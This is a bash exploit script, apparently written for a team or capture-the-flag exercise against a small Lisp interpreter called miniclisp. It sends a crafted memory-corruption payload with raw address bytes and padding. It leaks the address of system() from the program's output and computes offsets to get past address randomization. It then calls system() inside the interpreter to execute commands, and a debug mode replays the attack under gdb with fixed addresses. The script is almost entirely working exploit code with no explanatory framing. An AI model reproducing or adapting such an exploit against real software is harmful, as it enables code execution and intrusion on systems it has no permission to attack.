#!/bin/bash
OUTPUTFILE=output.tmp
MINICLISP=/tmp/team7/miniclisp

SYSTEMDEF=0
SYSTEMADDRESS=0
EXPRADDRESS=0

DYNLINE=0;
function getadress {
	#Get address of system from outputfile
	SYSTEMADDRESS=$(cat $OUTPUTFILE | grep "> 0x"| head -1 | cut -c 3-)
	
	#GET address of the expression which holds the systemcall
	EXPRADDRESS=$(cat $OUTPUTFILE | grep "> 0x"| tail -1 | cut -c 3-)
}
function getdynamicline {

	SYSTEMDEF=$(./hexto32byte $SYSTEMADDRESS 0x11FDC0 $EXPRADDRESS -451)
	DYNLINE=$(echo -e "(begin (define system $SYSTEMDEF) (a 0xa6e2433303125) 5)\nsystem\n(system 2666245823313162030)\n")
}
getadress
getdynamicline
echo "last output: address system: $SYSTEMADDRESS line: $SYSTEMDEF and address of expr $EXPRADDRESS "
SYSTEMDEF=0
DYNLINE=0

SHCODE=$'(define a \x60\x86\x04\x08aaaaaabbbbbbbbbbccccccccccdd)\x0Aa\x0A(a 44831093285)\n(a 0xa70243925)\n'

if [ "$1" == "-g"  ]
then
	#set address for non randoizatied gdb
	SYSTEMADDRESS="0x288440"
	EXPRADDRESS="0x804e838"
	getdynamicline
	echo -e "$SHCODE$DYNLINE" >exploit1.txt
	gdb -ex "set args ARGUMENT < exploit1.txt" $MINICLISP
else
	(echo -e "$SHCODE\n"; sleep 1; getadress; getdynamicline; echo -e "$DYNLINE"; sleep 1000; echo -e "(+ 1336 1)\n(define system $SYSTEMDEF)\n(+ 1 41)\nsystem\n(system 2666245823313162030)\n"; sleep 100) | $MINICLISP > $OUTPUTFILE
fi
